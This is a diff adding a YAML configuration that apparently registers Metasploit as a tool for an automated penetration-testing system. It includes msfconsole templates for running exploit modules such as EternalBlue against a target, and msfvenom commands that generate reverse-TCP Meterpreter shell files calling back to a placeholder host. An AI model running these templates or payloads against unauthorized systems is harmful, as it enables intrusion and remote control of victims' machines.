@@ -1,0 +1,112 @@
+name: metasploit
+version: 6.3.0
+category: exploitation_framework
+description: "Comprehensive penetration testing and exploitation framework"
+
+capabilities:
+  - exploitation
+  - post_exploitation
+  - payload_generation
+  - auxiliary_scanning
+  - vulnerability_validation
+  - pivoting
+  - session_management
+
+target_compatibility:
+  os: [windows, linux, macos, android, ios]
+  protocols: [tcp, udp, http, https, smb, ssh]
+
+commands:
+  console:
+    template: "msfconsole"
+    description: "Start Metasploit console"
+    output_format: interactive
+    estimated_time: null
+  
+  search:
+    template: "msfconsole -q -x 'search {term}; exit'"
+    description: "Search for modules"
+    output_format: text
+    estimated_time: 5
+  
+  exploit_basic:
+    template: "msfconsole -q -x 'use {exploit}; set RHOSTS {target}; set LHOST {lhost}; exploit; exit'"
+    description: "Run exploit module"
+    output_format: text
+    estimated_time: 60
+  
+  auxiliary_scan:
+    template: "msfconsole -q -x 'use {auxiliary}; set RHOSTS {target}; run; exit'"
+    description: "Run auxiliary scanner"
+    output_format: text
+    estimated_time: 120
+  
+  resource_script:
+    template: "msfconsole -q -r {resource_file}"
+    description: "Run resource script"
+    output_format: text
+    estimated_time: null
+
+output_format: text
+requires_auth: false
+requires_root: false  # Some modules may require root
+
+module_types:
+  - exploit       # Exploit modules
+  - auxiliary     # Scanning/fuzzing modules
+  - post          # Post-exploitation modules
+  - payload       # Payload generators
+  - encoder       # Payload encoders
+  - nop           # NOP generators
+
+common_modules:
+  smb_scan: "auxiliary/scanner/smb/smb_version"
+  smb_exploit: "exploit/windows/smb/ms17_010_eternalblue"
+  ssh_login: "auxiliary/scanner/ssh/ssh_login"
+  http_scan: "auxiliary/scanner/http/http_version"
+
+complementary_tools:
+  - nmap          # Reconnaissance
+  - searchsploit  # Exploit database search
+  - msfvenom      # Standalone payload generator
+
+known_issues:
+  - "Large framework with learning curve"
+  - "Some exploits are outdated"
+  - "Payloads often detected by AV"
+  - "Requires significant system resources"
+
+success_indicators:
+  - "Meterpreter session"
+  - "Command shell session"
+  - "Session opened"
+  - "Exploit completed successfully"
+
+failure_indicators:
+  - "Exploit failed"
+  - "Connection refused"
+  - "Exploit aborted"
+  - "Target is not vulnerable"
+
+installation:
+  apt: "apt-get install metasploit-framework"
+  installer: "Download from rapid7.com"
+  github: "https://github.com/rapid7/metasploit-framework"
+  docker: "docker pull metasploitframework/metasploit-framework"
+
+effectiveness_baseline:
+  unpatched_systems: 0.85
+  patched_systems: 0.20
+  modern_os: 0.15
+
+database_integration:
+  - postgresql  # Store results
+  - workspace_management
+  - target_tracking
+
+msfvenom_payloads:
+  windows_reverse_tcp: "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe"
+  linux_reverse_tcp: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf"
+  php_reverse: "msfvenom -p php/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.php"
+
+ethical_warning: "Exploitation without authorization is illegal - only use on authorized systems"
